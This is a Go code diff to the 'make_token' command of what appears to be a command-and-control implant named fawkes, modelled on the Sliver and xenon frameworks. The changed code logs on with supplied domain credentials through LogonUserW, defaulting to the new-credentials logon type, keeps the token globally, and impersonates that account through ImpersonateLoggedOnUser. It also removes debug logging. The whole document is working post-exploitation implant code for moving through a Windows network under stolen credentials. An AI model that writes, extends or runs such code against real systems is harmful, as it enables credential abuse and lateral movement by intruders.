@@ -6,7 +6,6 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
-	"strings"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -22,6 +21,7 @@ const (
 	LOGON32_LOGON_INTERACTIVE     = 2
 	LOGON32_LOGON_NEW_CREDENTIALS = 9
 	LOGON32_PROVIDER_DEFAULT      = 0
+	LOGON32_PROVIDER_WINNT50      = 3
 )
 
 type MakeTokenCommand struct{}
@@ -35,18 +35,13 @@ func (c *MakeTokenCommand) Description() string {
 }
 
 type MakeTokenParams struct {
-	Username string `json:"username"`
-	Domain   string `json:"domain"`
-	Password string `json:"password"`
+	Username  string `json:"username"`
+	Domain    string `json:"domain"`
+	Password  string `json:"password"`
+	LogonType int    `json:"logon_type"` // Optional, defaults to LOGON32_LOGON_NEW_CREDENTIALS
 }
 
 func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
-	var debugLog strings.Builder
-	
-	// Enable required privileges for token manipulation
-	debugLog.WriteString("[DEBUG] Enabling token privileges...\n")
-	enableTokenPrivileges(&debugLog)
-	
 	var params MakeTokenParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
 		return structs.CommandResult{
@@ -75,32 +70,23 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] Attempting to create token for %s\\%s\n", params.Domain, params.Username))
-
-	// Try to get current token info
-	var output string
-	currentHandle, err := windows.GetCurrentProcess()
-	if err == nil {
-		var currentToken windows.Token
-		err = windows.OpenProcessToken(currentHandle, windows.TOKEN_QUERY, &currentToken)
-		if err == nil {
-			defer currentToken.Close()
-			currentUser, err := currentToken.GetTokenUser()
-			if err == nil {
-				currentUsername, currentDomain, _, err := currentUser.User.Sid.LookupAccount("")
-				if err == nil {
-					output = fmt.Sprintf("Old identity: %s\\%s\n", currentDomain, currentUsername)
-					debugLog.WriteString(fmt.Sprintf("[DEBUG] Current identity: %s\\%s\n", currentDomain, currentUsername))
-				}
-			}
-		}
+	// Default to LOGON32_LOGON_NEW_CREDENTIALS if not specified (like xenon)
+	if params.LogonType == 0 {
+		params.LogonType = LOGON32_LOGON_NEW_CREDENTIALS
 	}
+
+	// Revert any existing token first (like xenon's IdentityAgentRevertToken)
+	if gIdentityToken != 0 {
+		gIdentityToken.Close()
+		gIdentityToken = 0
+	}
+	windows.RevertToSelf()
 
 	// Convert strings to UTF-16
 	usernamePtr, err := windows.UTF16PtrFromString(params.Username)
 	if err != nil {
 		return structs.CommandResult{
-			Output:    debugLog.String() + output + fmt.Sprintf("Failed to convert username: %v", err),
+			Output:    fmt.Sprintf("Failed to convert username: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -109,7 +95,7 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	domainPtr, err := windows.UTF16PtrFromString(params.Domain)
 	if err != nil {
 		return structs.CommandResult{
-			Output:    debugLog.String() + output + fmt.Sprintf("Failed to convert domain: %v", err),
+			Output:    fmt.Sprintf("Failed to convert domain: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -118,82 +104,65 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	passwordPtr, err := windows.UTF16PtrFromString(params.Password)
 	if err != nil {
 		return structs.CommandResult{
-			Output:    debugLog.String() + output + fmt.Sprintf("Failed to convert password: %v", err),
+			Output:    fmt.Sprintf("Failed to convert password: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
 
-	// Call LogonUserW to create a new token (exactly like Sliver)
-	debugLog.WriteString("[DEBUG] Calling LogonUserW...\n")
-	var token windows.Token
+	// Determine provider based on logon type
+	provider := LOGON32_PROVIDER_DEFAULT
+	if params.LogonType == LOGON32_LOGON_NEW_CREDENTIALS {
+		provider = LOGON32_PROVIDER_WINNT50
+	}
+
+	// Call LogonUserW to create token (xenon stores directly into gIdentityToken)
 	ret, _, err := procLogonUserW.Call(
 		uintptr(unsafe.Pointer(usernamePtr)),
 		uintptr(unsafe.Pointer(domainPtr)),
 		uintptr(unsafe.Pointer(passwordPtr)),
-		uintptr(LOGON32_LOGON_INTERACTIVE),
-		uintptr(LOGON32_PROVIDER_DEFAULT),
-		uintptr(unsafe.Pointer(&token)),
+		uintptr(params.LogonType),
+		uintptr(provider),
+		uintptr(unsafe.Pointer(&gIdentityToken)),
 	)
 
 	if ret == 0 {
 		return structs.CommandResult{
-			Output:    debugLog.String() + output + fmt.Sprintf("LogonUserW failed: %v", err),
+			Output:    fmt.Sprintf("LogonUserW failed: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
 
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] LogonUserW succeeded, token: 0x%x\n", token))
-
-	// Impersonate directly using the token from LogonUser (like Sliver - NO duplication!)
-	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser...\n")
-	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(token))
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] ImpersonateLoggedOnUser returned: %d\n", ret))
+	// Impersonate using the token from LogonUserW (stored in gIdentityToken)
+	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(gIdentityToken))
 	if ret == 0 {
-		// Check the actual error
 		lastErr := windows.GetLastError()
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] GetLastError: 0x%x\n", lastErr))
-		token.Close()
+		gIdentityToken.Close()
+		gIdentityToken = 0
 		return structs.CommandResult{
-			Output:    debugLog.String() + output + fmt.Sprintf("ImpersonateLoggedOnUser failed (ret=%d, lastErr=0x%x)", ret, lastErr),
+			Output:    fmt.Sprintf("ImpersonateLoggedOnUser failed (error: 0x%x)", lastErr),
 			Status:    "error",
 			Completed: true,
 		}
 	}
 
-	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser succeeded\n")
-
-	// Keep token open - it will be closed on rev2self or process exit
-	
-	// Verify impersonation by checking thread token
-	debugLog.WriteString("[DEBUG] Verifying impersonation...\n")
-	var hThreadToken windows.Token
-	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &hThreadToken)
+	// Get the new identity for confirmation
+	var accountName string
+	threadTokenUser, err := gIdentityToken.GetTokenUser()
 	if err == nil {
-		defer hThreadToken.Close()
-		debugLog.WriteString("[DEBUG] OpenThreadToken succeeded\n")
-		threadTokenUser, err := hThreadToken.GetTokenUser()
+		username, domain, _, err := threadTokenUser.User.Sid.LookupAccount("")
 		if err == nil {
-			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
-			if err == nil {
-				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
-				debugLog.WriteString(fmt.Sprintf("[DEBUG] Verified: %s\\%s\n", currentDomain, currentUsername))
-			} else {
-				output += "Successfully impersonated (verification SID lookup failed)"
-				debugLog.WriteString(fmt.Sprintf("[DEBUG] SID lookup failed: %v\n", err))
-			}
+			accountName = fmt.Sprintf("%s\\%s", domain, username)
 		} else {
-			output += "Successfully impersonated (verification GetTokenUser failed)"
-			debugLog.WriteString(fmt.Sprintf("[DEBUG] GetTokenUser failed: %v\n", err))
+			accountName = "Successfully impersonated (SID lookup failed)"
 		}
 	} else {
-		output += fmt.Sprintf("Warning: Impersonation succeeded but verification failed: %v", err)
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenThreadToken failed: %v\n", err))
+		accountName = "Successfully impersonated (GetTokenUser failed)"
 	}
 
 	return structs.CommandResult{
-		Output:    debugLog.String() + "\n" + strings.TrimSpace(output),
+		Output:    accountName,
 		Status:    "success",
 		Completed: true,
 	}
